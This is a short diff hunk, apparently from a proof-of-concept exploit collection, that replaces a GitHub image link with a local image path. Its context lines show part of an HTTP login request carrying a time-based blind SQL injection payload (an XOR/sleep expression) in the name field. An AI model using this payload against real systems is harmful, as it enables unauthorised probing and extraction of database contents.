@@ -21,4 +21,4 @@ Content-Length: 77
 
 name=0'XOR(if(now()=sysdate()%2Csleep(7)%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
 ```
-![a9c6cfee7dd8881ea4bf019d82903c04](https://github.com/wy876/POC/assets/139549762/349eafe6-c55e-449f-b6e4-bb01923c07ef)
+![a9c6cfee7dd8881ea4bf019d82903c04](../../images/349eafe6-c55e-449f-b6e4-bb01923c07ef.png)
